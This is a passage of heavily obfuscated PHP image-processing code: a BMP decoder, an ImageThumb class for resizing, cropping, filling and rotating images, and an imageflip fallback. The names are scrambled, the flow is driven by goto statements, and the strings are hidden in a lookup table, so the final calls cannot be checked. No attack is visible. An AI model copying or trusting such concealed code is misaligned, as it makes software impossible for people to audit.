$Fô«¥Â„¶ß) = unpack($Cù¥¯‚«¶œ[1814], $Cö…é««¡Ö); if ($Fô«¥Â„¶ß == 12) { goto DŠ‚Òñ“Àğ; E¥Ö¼í²Ñ³: $AİËé„ÉŠÍ = $AëóÖ·Üä· = $FØçæ³ŒõŠ = $B·­¤Õ÷ = 0; $C¿¿Ş¢·í‚ = 16711680; $A¨Ë–äª£ = 65280; goto EáŒ±¤ÓË; DŠ‚Òñ“Àğ: $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $Fô«¥Â„¶ß - 4); if ($Cö…é««¡Ö === !1) { return !1; } extract(unpack($Cù¥¯‚«¶œ[1815] . $Cù¥¯‚«¶œ[1816] . $Cù¥¯‚«¶œ[1817] . $Cù¥¯‚«¶œ[1818], $Cö…é««¡Ö)); goto E¥Ö¼í²Ñ³; EáŒ±¤ÓË: $e÷ŞÎ™ùô = 255; goto Câ™õÏ„‡Í; Câ™õÏ„‡Í: } else { if (124 < $Fô«¥Â„¶ß || $Fô«¥Â„¶ß < 40) { return !1; } else { goto cåˆÁùâˆ ; f‰Ú§—¿¹œ: if (($FÖŸÈ‡èƒÔ == 16 || $FÖŸÈ‡èƒÔ == 24 || $FÖŸÈ‡èƒÔ == 32) && $B·­¤Õ÷ == 0 && $C¿¿Ş¢·í‚ == 0 && $A¨Ë–äª£ == 0 && $e÷ŞÎ™ùô == 0) { switch ($FÖŸÈ‡èƒÔ) { case 16: $C¿¿Ş¢·í‚ = 31744; $A¨Ë–äª£ = 992; $e÷ŞÎ™ùô = 31; break; case 24: case 32: $C¿¿Ş¢·í‚ = 16711680; $A¨Ë–äª£ = 65280; $e÷ŞÎ™ùô = 255; break; } } goto cÈ´º¶á‹; aƒáï¸å: if ($fñëˆÈº‘± & 2147483648) { $fñëˆÈº‘± = -(~$fñëˆÈº‘± & 4294967295) - 1; } if ($F¢›Ù†Û²¨ & 2147483648) { $F¢›Ù†Û²¨ = -(~$F¢›Ù†Û²¨ & 4294967295) - 1; } if ($cÄ›Î·å¤» & 2147483648) { $cÄ›Î·å¤» = -(~$cÄ›Î·å¤» & 4294967295) - 1; } goto EÛ”À»°‘; EÛ”À»°‘: if ($E·Á…ß¢¯Ô & 2147483648) { $E·Á…ß¢¯Ô = -(~$E·Á…ß¢¯Ô & 4294967295) - 1; } if ($EÃ«×•ƒ‰ñ[$Cù¥¯‚«¶œ[516]] != 0) { $eø´’ìä·• = $FÖŸÈ‡èƒÔ == 1 || $FÖŸÈ‡èƒÔ == 4 || $FÖŸÈ‡èƒÔ == 8 ? ($AİËé„ÉŠÍ ? $AİËé„ÉŠÍ : pow(2, $FÖŸÈ‡èƒÔ)) << 2 : 0; $AÍ˜²Ïäãî = $e­êå†ğÃ° ? $e­êå†ğÃ° : ($fñëˆÈº‘± * $FÖŸÈ‡èƒÔ + 31 >> 3 & ~3) * abs($F¢›Ù†Û²¨); $cøÔÂ±›ô = $EÃ«×•ƒ‰ñ[$Cù¥¯‚«¶œ[516]] - $AÍ˜²Ïäãî - $eø´’ìä·• - 14; if ($Fô«¥Â„¶ß < $cøÔÂ±›ô && 40 <= $Fô«¥Â„¶ß && $Fô«¥Â„¶ß <= 124) { $Fô«¥Â„¶ß = $cøÔÂ±›ô; } } if ($Fô«¥Â„¶ß - 40 > 0) { $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $Fô«¥Â„¶ß - 40); if ($Cö…é««¡Ö === !1) { return !1; } extract(unpack($Cù¥¯‚«¶œ[1828] . $Cù¥¯‚«¶œ[1829] . $Cù¥¯‚«¶œ[1830] . $Cù¥¯‚«¶œ[1831], $Cö…é««¡Ö . str_repeat($Cù¥¯‚«¶œ[1832], 120))); } else { $FØçæ³ŒõŠ = $C¿¿Ş¢·í‚ = $A¨Ë–äª£ = $e÷ŞÎ™ùô = 0; } goto f‰Ú§—¿¹œ; cåˆÁùâˆ : $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, 36); if ($Cö…é««¡Ö === !1) { return !1; } extract(unpack($Cù¥¯‚«¶œ[1819] . $Cù¥¯‚«¶œ[1820] . $Cù¥¯‚«¶œ[1817] . $Cù¥¯‚«¶œ[1821] . $Cù¥¯‚«¶œ[1822] . $Cù¥¯‚«¶œ[1823] . $Cù¥¯‚«¶œ[1824] . $Cù¥¯‚«¶œ[1825] . $Cù¥¯‚«¶œ[1826] . $Cù¥¯‚«¶œ[1827], $Cö…é««¡Ö)); goto aƒáï¸å; cÈ´º¶á‹: } } goto AéÎá‰Ô–; a­ª¿ö„»­: if ($FÖŸÈ‡èƒÔ == 1 || $FÖŸÈ‡èƒÔ == 4 || $FÖŸÈ‡èƒÔ == 8) { goto eÑÌÛ‹åå£; f¬š¬ÂŠ“Ò: $bÈÜÕííÀ‘ = array(); for ($fšãÜÔÅß¨ = 0; $fšãÜÔÅß¨ < $D‹Íùİò–³; ++$fšãÜÔÅß¨) { $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $d¯‰™Âºã§); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } extract(unpack($Cù¥¯‚«¶œ[1833], $Cö…é««¡Ö . $Cù¥¯‚«¶œ[1832])); $bÈÜÕííÀ‘[] = imagecolorallocate($aª’£›Šİ, $eâî¬¡ºÑä, $CÚäÅñìÌ, $b‰èÑâ¸ŸÑ); } $Bœø§ª‰Ğ„ = 8 - $FÖŸÈ‡èƒÔ; goto Cçô¶â—°”; eÑÌÛ‹åå£: $aª’£›Šİ = imagecreate($fñëˆÈº‘±, $D¿›½ƒïáè); $d¯‰™Âºã§ = $Fô«¥Â„¶ß == 12 ? 3 : 4; $D‹Íùİò–³ = $AİËé„ÉŠÍ ? $AİËé„ÉŠÍ : pow(2, $FÖŸÈ‡èƒÔ); goto f¬š¬ÂŠ“Ò; Cçô¶â—°”: $b…†Ç¶íÚ… = (1 << $FÖŸÈ‡èƒÔ) - 1 << $Bœø§ª‰Ğ„; if ($B·­¤Õ÷ == 1 || $B·­¤Õ÷ == 2) { $bãÍÖ«­Éë = 0; $B×ëÕ¯šÄÓ = $FÖŸÈ‡èƒÔ >> 2 & 1; for (;;) { if ($bãÍÖ«­Éë < -1 || $bãÍÖ«­Éë > $fñëˆÈº‘± || $B‘ÙÓ‹—Ë¤ < -1 || $B‘ÙÓ‹—Ë¤ > $F¢›Ù†Û²¨) { imagedestroy($aª’£›Šİ); return !1; } $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, 1); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } switch ($Cö…é««¡Ö) { case $Cù¥¯‚«¶œ[1832]: $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, 1); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } switch ($Cö…é««¡Ö) { case $Cù¥¯‚«¶œ[1832]: $B‘ÙÓ‹—Ë¤ += $AØÌÃÃø×°; $bãÍÖ«­Éë = 0; break; case $Cù¥¯‚«¶œ[1834]: $B‘ÙÓ‹—Ë¤ = 0; $bãÍÖ«­Éë = 0; break 3; case $Cù¥¯‚«¶œ[1835]: $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, 2); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } list(, $cøƒ–»Ñ“, $CËˆ´ššÈ) = unpack($Cù¥¯‚«¶œ[1836], $Cö…é««¡Ö); $bãÍÖ«­Éë += $cøƒ–»Ñ“; $B‘ÙÓ‹—Ë¤ += $CËˆ´ššÈ * $AØÌÃÃø×°; break; default: list(, $cÍº××îŠ) = unpack($Cù¥¯‚«¶œ[1837], $Cö…é««¡Ö); $cà££ÌÃ = ($cÍº××îŠ >> $B×ëÕ¯šÄÓ) + ($cÍº××îŠ & $B×ëÕ¯šÄÓ); $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $cà££ÌÃ + 1 & ~1); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } for ($fšãÜÔÅß¨ = 0, $d«‹®¥ù’ˆ = 0; $fšãÜÔÅß¨ < $cÍº××îŠ; ++$fšãÜÔÅß¨, ++$bãÍÖ«­Éë, $d«‹®¥ù’ˆ += $FÖŸÈ‡èƒÔ) { list(, $aëóÁÎ§â‡) = unpack($Cù¥¯‚«¶œ[1837], $Cö…é««¡Ö[$d«‹®¥ù’ˆ >> 3]); $b‰èÑâ¸ŸÑ = $d«‹®¥ù’ˆ & 7; imagesetpixel($aª’£›Šİ, $bãÍÖ«­Éë, $B‘ÙÓ‹—Ë¤, $bÈÜÕííÀ‘[($aëóÁÎ§â‡ & $b…†Ç¶íÚ… >> $b‰èÑâ¸ŸÑ) >> $Bœø§ª‰Ğ„ - $b‰èÑâ¸ŸÑ]); } break; } break; default: $DëŠÉ ²’ = fread($e¢çÀ‡Ú…É, 1); if ($DëŠÉ ²’ === !1) { imagedestroy($aª’£›Šİ); return !1; } list(, $eËµŞ ¨Ã™, $aëóÁÎ§â‡) = unpack($Cù¥¯‚«¶œ[1836], $Cö…é««¡Ö . $DëŠÉ ²’); for ($fšãÜÔÅß¨ = 0, $d«‹®¥ù’ˆ = 0; $fšãÜÔÅß¨ < $eËµŞ ¨Ã™; ++$fšãÜÔÅß¨, ++$bãÍÖ«­Éë, $d«‹®¥ù’ˆ += $FÖŸÈ‡èƒÔ) { $b‰èÑâ¸ŸÑ = $d«‹®¥ù’ˆ & 7; imagesetpixel($aª’£›Šİ, $bãÍÖ«­Éë, $B‘ÙÓ‹—Ë¤, $bÈÜÕííÀ‘[($aëóÁÎ§â‡ & $b…†Ç¶íÚ… >> $b‰èÑâ¸ŸÑ) >> $Bœø§ª‰Ğ„ - $b‰èÑâ¸ŸÑ]); } break; } } } else { for ($F¶¾Ö¶÷ôÃ = 0; $F¶¾Ö¶÷ôÃ < $D¿›½ƒïáè; ++$F¶¾Ö¶÷ôÃ, $B‘ÙÓ‹—Ë¤ += $AØÌÃÃø×°) { $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $f•¢ŞéòŞ’); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } $d«‹®¥ù’ˆ = 0; for ($bãÍÖ«­Éë = 0; $bãÍÖ«­Éë < $fñëˆÈº‘±; ++$bãÍÖ«­Éë, $d«‹®¥ù’ˆ += $FÖŸÈ‡èƒÔ) { list(, $aëóÁÎ§â‡) = unpack($Cù¥¯‚«¶œ[1837], $Cö…é««¡Ö[$d«‹®¥ù’ˆ >> 3]); $b‰èÑâ¸ŸÑ = $d«‹®¥ù’ˆ & 7; imagesetpixel($aª’£›Šİ, $bãÍÖ«­Éë, $B‘ÙÓ‹—Ë¤, $bÈÜÕííÀ‘[($aëóÁÎ§â‡ & $b…†Ç¶íÚ… >> $b‰èÑâ¸ŸÑ) >> $Bœø§ª‰Ğ„ - $b‰èÑâ¸ŸÑ]); } } } goto fš¾ôè„Šˆ; fš¾ôè„Šˆ: } else { goto CóœÉ¾ÅŸ; bÖåÎ»İÖ: $dĞğÚçÑº® = $FÖŸÈ‡èƒÔ >> 3; $EˆÆ‡‰—Ò = $FØçæ³ŒõŠ ? 127 : 0; $FÖò†®ëùŸ = $FØçæ³ŒõŠ ? 1 / $FØçæ³ŒõŠ : 1; goto a…¥‚îÇ; a…¥‚îÇ: $f»ÎÅÕÍá = $C¿¿Ş¢·í‚ ? 1 / $C¿¿Ş¢·í‚ : 1; $EîŞ ŠÔñÔ = $A¨Ë–äª£ ? 1 / $A¨Ë–äª£ : 1; $AËï¯Ã½„ = $e÷ŞÎ™ùô ? 1 / $e÷ŞÎ™ùô : 1; goto c¥„¯½Öî; c¥„¯½Öî: for ($F¶¾Ö¶÷ôÃ = 0; $F¶¾Ö¶÷ôÃ < $D¿›½ƒïáè; ++$F¶¾Ö¶÷ôÃ, $B‘ÙÓ‹—Ë¤ += $AØÌÃÃø×°) { $Cö…é««¡Ö = fread($e¢çÀ‡Ú…É, $f•¢ŞéòŞ’); if ($Cö…é««¡Ö === !1) { imagedestroy($aª’£›Šİ); return !1; } $d«‹®¥ù’ˆ = 0; for ($bãÍÖ«­Éë = 0; $bãÍÖ«­Éë < $fñëˆÈº‘±; ++$bãÍÖ«­Éë, $d«‹®¥ù’ˆ += $dĞğÚçÑº®) { list(, $aëóÁÎ§â‡) = unpack($Cù¥¯‚«¶œ[1814], substr($Cö…é««¡Ö, $d«‹®¥ù’ˆ, $dĞğÚçÑº®) . $Cù¥¯‚«¶œ[1838]); $D–¶ççÅÈ— = $aëóÁÎ§â‡ & $FØçæ³ŒõŠ; $dÜŒİŒİ¾ñ = $aëóÁÎ§â‡ & $C¿¿Ş¢·í‚; $cŠ¾Ïêœ· = $aëóÁÎ§â‡ & $A¨Ë–äª£; $aË»‡ˆ¡œø = $aëóÁÎ§â‡ & $e÷ŞÎ™ùô; $FŸº®ßø Î = $EˆÆ‡‰—Ò - (($D–¶ççÅÈ— << 7) - $D–¶ççÅÈ—) * $FÖò†®ëùŸ; $eâî¬¡ºÑä = (($dÜŒİŒİ¾ñ << 8) - $dÜŒİŒİ¾ñ) * $f»ÎÅÕÍá; $CÚäÅñìÌ = (($cŠ¾Ïêœ· << 8) - $cŠ¾Ïêœ·) * $EîŞ ŠÔñÔ; $b‰èÑâ¸ŸÑ = (($aË»‡ˆ¡œø << 8) - $aË»‡ˆ¡œø) * $AËï¯Ã½„; imagesetpixel($aª’£›Šİ, $bãÍÖ«­Éë, $B‘ÙÓ‹—Ë¤, $FŸº®ßø Î << 24 | $eâî¬¡ºÑä << 16 | $CÚäÅñìÌ << 8 | $b‰èÑâ¸ŸÑ); } } imagealphablending($aª’£›Šİ, !0); goto E¾Ÿ‚ºÒ„Œ; CóœÉ¾ÅŸ: $aª’£›Šİ = imagecreatetruecolor($fñëˆÈº‘±, $D¿›½ƒïáè); imagealphablending($aª’£›Šİ, !1); if ($FØçæ³ŒõŠ) { imagesavealpha($aª’£›Šİ, !0); } goto bÖåÎ»İÖ; E¾Ÿ‚ºÒ„Œ: } return $aª’£›Šİ; goto CíôƒõŒ×; CíôƒõŒ×: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($FÁà „µÀ†, $B‰éË·§‚) { goto B›ÂÂ¾¶³; C©¶åÍÁÊ…: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto e¶ƒŞÎğ»¨; B›ÂÂ¾¶³: $this->srcFile = $FÁà „µÀ†; $this->echoType = $B‰éË·§‚; $this->im = self::image($FÁà „µÀ†); goto A‚×Í™¦Ì; A‚×Í™¦Ì: if (!$this->im) { return !1; } $BÁÖ‰ò‰Ÿ‹ = $_SERVER[Ö¹ñÒÁ²÷][33]; $this->imgData = GetImageSize($FÁà „µÀ†, $BÁÖ‰ò‰Ÿ‹); goto C©¶åÍÁÊ…; e¶ƒŞÎğ»¨: } public static function image($cÈŞ‡™ª¥) { $fÊÅ¹«¯Â£ =& $_SERVER[Ö¹ñÒÁ²÷]; $Dôˆîî‡ª‘ = $fÊÅ¹«¯Â£[33]; $c¹è™¸¢ê² = GetImageSize($cÈŞ‡™ª¥, $Dôˆîî‡ª‘); $eöÛª–ŒÒŒ = !1; switch ($c¹è™¸¢ê²[2]) { case IMAGETYPE_GIF: if (!function_exists($fÊÅ¹«¯Â£[1839])) { break; } $eöÛª–ŒÒŒ = imagecreatefromgif($cÈŞ‡™ª¥); break; case IMAGETYPE_JPEG: if (!function_exists($fÊÅ¹«¯Â£[1840])) { break; } $eöÛª–ŒÒŒ = imagecreatefromjpeg($cÈŞ‡™ª¥); break; case IMAGETYPE_PNG: if (!function_exists($fÊÅ¹«¯Â£[1841])) { break; } $eöÛª–ŒÒŒ = @imagecreatefrompng($cÈŞ‡™ª¥); imagesavealpha($eöÛª–ŒÒŒ, !0); break; case IMAGETYPE_XBM: $eöÛª–ŒÒŒ = imagecreatefromxbm($cÈŞ‡™ª¥); break; case IMAGETYPE_WBMP: $eöÛª–ŒÒŒ = imagecreatefromwbmp($cÈŞ‡™ª¥); break; case IMAGETYPE_BMP: $eöÛª–ŒÒŒ = imagecreatefrombmp($cÈŞ‡™ª¥); break; default: break; } return $eöÛª–ŒÒŒ; } public static function imageSize($a‘ÆÃİ­ôŒ) { $DâÔàİÓ·© =& $_SERVER[Ö¹ñÒÁ²÷]; $CÍ®«®Üì¼ = GetImageSize($a‘ÆÃİ­ôŒ); if (!$CÍ®«®Üì¼) { return !1; } return array($DâÔàİÓ·©[1842] => $CÍ®«®Üì¼[0], $DâÔàİÓ·©[1843] => $CÍ®«®Üì¼[1]); } function distortion($FÒÎÓ±ö¤, $dˆœƒÂØ£ó, $e»Ô †é±¾) { $CáºÂÆ¬Ö = $this->creatImage($this->im, $dˆœƒÂØ£ó, $e»Ô †é±¾, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($CáºÂÆ¬Ö, $FÒÎÓ±ö¤); } function prorate($FÛÓ´†…², $e§ÁÊ±ê‚õ, $dˆÌ„†®¤—) { $B±Î¿™Ûôğ = $e§ÁÊ±ê‚õ / $dˆÌ„†®¤—; $dÅÙ¢ŞÆê© = $this->srcW / $this->srcH; if ($B±Î¿™Ûôğ <= $dÅÙ¢ŞÆê©) { $DøéæÍëˆ = $e§ÁÊ±ê‚õ; $d´÷­Şæ° = $DøéæÍëˆ * ($this->srcH / $this->srcW); } else { $d´÷­Şæ° = $dˆÌ„†®¤—; $DøéæÍëˆ = $d´÷­Şæ° * ($this->srcW / $this->srcH); } if ($this->srcW > $e§ÁÊ±ê‚õ || $this->srcH > $dˆÌ„†®¤—) { $E‰ºó±á± = $this->creatImage($this->im, $DøéæÍëˆ, $d´÷­Şæ°, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($E‰ºó±á±, $FÛÓ´†…²); } else { $E‰ºó±á± = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($E‰ºó±á±, $FÛÓ´†…²); } } function cut($dÜç—ô¼Âè, $B–’†íƒÍ, $f‘Œƒ‘„¤†) { goto FëµÓƒ»Óë; aäóŠƒ×: return $this->echoImage($Cç«áŒ×‰, $dÜç—ô¼Âè); goto C„Î£»Õ¿; FëµÓƒ»Óë: $eÆÈÒİë÷ø = $B–’†íƒÍ / $f‘Œƒ‘„¤†; $D¸­«¥„ë± = $this->srcW / $this->srcH; if ($eÆÈÒİë÷ø <= $D¸­«¥„ë±) { $cª÷Å‚óĞƒ = $f‘Œƒ‘„¤†; $DâÂ†Áƒ™Û = $cª÷Å‚óĞƒ * ($this->srcW / $this->srcH); } else { $DâÂ†Áƒ™Û = $B–’†íƒÍ; $cª÷Å‚óĞƒ = $DâÂ†Áƒ™Û * ($this->srcH / $this->srcW); } goto E÷Èˆ±’–; E÷Èˆ±’–: $eàæ¯—Î÷ƒ = $this->creatImage($this->im, $DâÂ†Áƒ™Û, $cª÷Å‚óĞƒ, 0, 0, 0, 0, $this->srcW, $this->srcH); $Cç«áŒ×‰ = $this->creatImage($eàæ¯—Î÷ƒ, $B–’†íƒÍ, $f‘Œƒ‘„¤†, 0, 0, ($DâÂ†Áƒ™Û - $B–’†íƒÍ) / 2, ($cª÷Å‚óĞƒ - $f‘Œƒ‘„¤†) / 2, $B–’†íƒÍ, $f‘Œƒ‘„¤†); imageDestroy($eàæ¯—Î÷ƒ); goto aäóŠƒ×; C„Î£»Õ¿: } function backFill($DÖÑäéÅ¯¤, $bİêêÅáğò, $DÚéÁóÃŒ‹, $f¬Îîçó¿„ = false, $Aã•ò‘œêÇ = 255, $C¯í’ Š§ = 255, $bš¸áØ‚Ü¿ = 255) { goto D·²İîªÏÇ; BÇ‰ŒøÏèØ: if ($f¬Îîçó¿„) { $bâ…íˆèåö = imageColorTransparent($FŒŒ¾ó£Å¸, $bâ…íˆèåö); $CŞ’Ğ‚š¡ = $DÚéÁóÃŒ‹ - $Bñ·Æ•ö; } imageFilledRectangle($FŒŒ¾ó£Å¸, 0, 0, $bİêêÅáğò, $DÚéÁóÃŒ‹, $bâ…íˆèåö); if ($this->srcW > $bİêêÅáğò || $this->srcH > $DÚéÁóÃŒ‹) { $F‡‡Û ÂÒ = $this->creatImage($this->im, $bßàöøÈÓ™, $Bñ·Æ•ö, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bßàöøÈÓ™ < $bİêêÅáğò) { imageCopy($FŒŒ¾ó£Å¸, $F‡‡Û ÂÒ, ($bİêêÅáğò - $bßàöøÈÓ™) / 2, 0, 0, 0, $bßàöøÈÓ™, $Bñ·Æ•ö); } else { if ($Bñ·Æ•ö < $DÚéÁóÃŒ‹) { imageCopy($FŒŒ¾ó£Å¸, $F‡‡Û ÂÒ, 0, $CŞ’Ğ‚š¡, 0, 0, $bßàöøÈÓ™, $Bñ·Æ•ö); } else { imageCopy($FŒŒ¾ó£Å¸, $F‡‡Û ÂÒ, 0, 0, 0, 0, $bßàöøÈÓ™, $Bñ·Æ•ö); } } } else { imageCopyMerge($FŒŒ¾ó£Å¸, $this->im, ($bİêêÅáğò - $bßàöøÈÓ™) / 2, $CŞ’Ğ‚š¡, 0, 0, $bßàöøÈÓ™, $Bñ·Æ•ö, 100); } goto D»½ÑÆÜÅâ; d­ºÑÇÌøÎ: if (function_exists($_SERVER[Ö¹ñÒÁ²÷][1844])) { @($FŒŒ¾ó£Å¸ = imageCreateTrueColor($bİêêÅáğò, $DÚéÁóÃŒ‹)); if (!$FŒŒ¾ó£Å¸) { $FŒŒ¾ó£Å¸ = imageCreate($bİêêÅáğò, $DÚéÁóÃŒ‹); } } else { $FŒŒ¾ó£Å¸ = imageCreate($bİêêÅáğò, $DÚéÁóÃŒ‹); } $CŞ’Ğ‚š¡ = ($DÚéÁóÃŒ‹ - $Bñ·Æ•ö) / 2; $bâ…íˆèåö = imagecolorallocate($FŒŒ¾ó£Å¸, $Aã•ò‘œêÇ, $C¯í’ Š§, $bš¸áØ‚Ü¿); goto BÇ‰ŒøÏèØ; D·²İîªÏÇ: $bã÷Åø•× = $bİêêÅáğò / $DÚéÁóÃŒ‹; $Bï¬…‹ˆ¹• = $this->srcW / $this->srcH; if ($bã÷Åø•× <= $Bï¬…‹ˆ¹•) { $bßàöøÈÓ™ = $bİêêÅáğò; $Bñ·Æ•ö = $bßàöøÈÓ™ * ($this->srcH / $this->srcW); } else { $Bñ·Æ•ö = $DÚéÁóÃŒ‹; $bßàöøÈÓ™ = $Bñ·Æ•ö * ($this->srcW / $this->srcH); } goto d­ºÑÇÌøÎ; D»½ÑÆÜÅâ: return $this->echoImage($FŒŒ¾ó£Å¸, $DÖÑäéÅ¯¤); goto B¦¯öĞîì÷; B¦¯öĞîì÷: } function creatImage($c¡ÅŒ»É»ˆ, $bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ, $f¢«¿Õ´‹Ü, $A¯Ë§‡©«æ, $D“¨…ÏÕ, $AÚôƒòùƒ, $EÑæóÑ¥–·, $dË½‹Íïê) { if (function_exists($_SERVER[Ö¹ñÒÁ²÷][1844])) { @($eÖó–âÏÛÔ = ImageCreateTrueColor($bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ)); @imagealphablending($eÖó–âÏÛÔ, !1); @imagesavealpha($eÖó–âÏÛÔ, !0); if ($eÖó–âÏÛÔ) { imageCopyResampled($eÖó–âÏÛÔ, $c¡ÅŒ»É»ˆ, $f¢«¿Õ´‹Ü, $A¯Ë§‡©«æ, $D“¨…ÏÕ, $AÚôƒòùƒ, $bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ, $EÑæóÑ¥–·, $dË½‹Íïê); } else { $eÖó–âÏÛÔ = ImageCreate($bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ); imageCopyResized($eÖó–âÏÛÔ, $c¡ÅŒ»É»ˆ, $f¢«¿Õ´‹Ü, $A¯Ë§‡©«æ, $D“¨…ÏÕ, $AÚôƒòùƒ, $bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ, $EÑæóÑ¥–·, $dË½‹Íïê); } } else { $eÖó–âÏÛÔ = ImageCreate($bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ); imageCopyResized($eÖó–âÏÛÔ, $c¡ÅŒ»É»ˆ, $f¢«¿Õ´‹Ü, $A¯Ë§‡©«æ, $D“¨…ÏÕ, $AÚôƒòùƒ, $bĞ—Ñ·¢˜«, $a¬Í‡‡ßÖŒ, $EÑæóÑ¥–·, $dË½‹Íïê); } return $eÖó–âÏÛÔ; } public function imgRotate($A§Å¼¶øÌó, $bÔ²ãÒò ) { goto dÖ…¥ŠÌ±; dÖ…¥ŠÌ±: if (!$this->im || $bÔ²ãÒò  % 360 === 0 || !function_exists($_SERVER[Ö¹ñÒÁ²÷][1845])) { return !1; } $EâÀ±²å† = imageRotate($this->im, 360 - $bÔ²ãÒò , 0); $Bß¼â’Ÿè = !1; goto c·´“ä¾¶; dôÌÏæ¥éË: return $Bß¼â’Ÿè; goto b÷Õ¶¹ÛÍÆ; c·´“ä¾¶: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $Bß¼â’Ÿè = imagegif($EâÀ±²å†, $A§Å¼¶øÌó); break; case IMAGETYPE_JPEG: $Bß¼â’Ÿè = imagejpeg($EâÀ±²å†, $A§Å¼¶øÌó, 100); break; case IMAGETYPE_PNG: $Bß¼â’Ÿè = imagePNG($EâÀ±²å†, $A§Å¼¶øÌó); break; default: break; } imageDestroy($EâÀ±²å†); imageDestroy($this->im); goto dôÌÏæ¥éË; b÷Õ¶¹ÛÍÆ: } function echoImage($c£”ª²ˆˆÔ, $F¦¬ÙèÈªÁ) { goto fæª×Â÷Ã; fæª×Â÷Ã: $eÌ¾çÚòÆê =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$c£”ª²ˆˆÔ) { return !1; } ob_get_clean(); goto CéÄ—¨•ƒ˜; e¡¢Ö¤±–‹: imageDestroy($this->im); return $BÑ¼å»¥´â; goto C‹ÔŒãåËŞ; CéÄ—¨•ƒ˜: $BÑ¼å»¥´â = !1; switch ($this->echoType) { case $eÌ¾çÚòÆê[1846]: $BÑ¼å»¥´â = imagePNG($c£”ª²ˆˆÔ); break; case $eÌ¾çÚòÆê[163]: $BÑ¼å»¥´â = imagePNG($c£”ª²ˆˆÔ, $F¦¬ÙèÈªÁ); break; } imageDestroy($c£”ª²ˆˆÔ); goto e¡¢Ö¤±–‹; C‹ÔŒãåËŞ: } } if (!function_exists($_SERVER[Ö¹ñÒÁ²÷][1847])) { define($_SERVER[Ö¹ñÒÁ²÷][1848], 0); define($_SERVER[Ö¹ñÒÁ²÷][1849], 1); define($_SERVER[Ö¹ñÒÁ²÷][1850], 2); function imageflip($a‹‚¯¾¬º£, $CëÍŞõ„®Û) { switch ($CëÍŞõ„®Û) { case IMG_FLIP_HORIZONTAL: $b’Ìùà²İò = imagesx($a‹‚¯¾¬º£) - 1; $A¾‰é¶º‡ = $b’Ìùà²İò / 2; $DÌòŠ…÷ß = imagesy($a‹‚¯¾¬º£); $CÔìãæõ¦î = imageistruecolor($a‹‚¯¾¬º£) ? imagecreatetruecolor(1, $DÌòŠ…÷ß) : imagecreate(1, $DÌòŠ…÷ß); for ($eÆÇôæ‚Û = 0; $eÆÇôæ‚Û < $A¾‰é¶º‡; ++$eÆÇôæ‚Û) { imagecopy($CÔìãæõ¦î, $a‹‚¯¾¬º£, 0, 0, $eÆÇôæ‚Û, 0, 1, $DÌòŠ…÷ß); imagecopy($a‹‚¯¾¬º£, $a‹‚¯¾¬º£, $eÆÇôæ‚Û, 0, $b’Ìùà²İò - $eÆÇôæ‚Û, 0, 1, $DÌòŠ…÷ß); imagecopy($a‹‚¯¾¬º£, $CÔìãæõ¦î, $b’Ìùà²İò - $eÆÇôæ‚Û, 0, 0, 0, 1, $DÌòŠ…÷ß); } break; case IMG_FLIP_VERTICAL: $E½¨®ƒ§¿ò = imagesx($a‹‚¯¾¬º£); $e¢²¹ËßŠ = imagesy($a‹‚¯¾¬º£) - 1; $D¸™¤ÛÊ• = $e¢²¹ËßŠ / 2; $CÔìãæõ¦î = imageistruecolor($a‹‚¯¾¬º£) ? imagecreatetruecolor($E½¨®ƒ§¿ò, 1) : imagecreate($E½¨®ƒ§¿ò, 1); for ($f”É÷¾â¶ğ = 0; $f”É÷¾â¶ğ < $D¸™¤ÛÊ•; ++$f”É÷¾â¶ğ) { imagecopy($CÔìãæõ¦î, $a‹‚¯¾¬º£, 0, 0, 0, $f”É÷¾â¶ğ, $E½¨®ƒ§¿ò, 1); imagecopy($a‹‚¯¾¬º£, $a‹‚¯¾¬º£, 0, $f”É÷¾â¶ğ, 0, $e¢²¹ËßŠ - $f”É÷¾â¶ğ, $E½¨®ƒ§¿ò, 1); imagecopy($a‹‚¯¾¬º£, $CÔìãæõ¦î, 0, $e¢²¹ËßŠ - $f”É÷¾â¶ğ, 0, 0, $E½¨®ƒ§¿ò, 1); } break; case IMG_FLIP_BOTH: $E½¨®ƒ§¿ò = imagesx($a‹‚¯¾¬º£); $DÌòŠ…÷ß = imagesy($a‹‚¯¾¬º£); $CÔìãæõ¦î = imagerotate($a‹‚¯¾¬º£, 180, 0); imagecopy($a‹‚¯¾¬º£, $CÔìãæõ¦î, 0, 0, 0, 0, $E½¨®ƒ§¿ò, $DÌòŠ…÷ß); break; default: return; } imagedestroy($CÔìãæõ¦î); } } goto A÷§Š»ùÓ; E³è‘ó¶·„: define($_SERVER[Ö¹ñÒÁ²÷][0], $_SERVER[Ö¹ñÒÁ²÷][1]); $_SERVER[¡Äç²] = 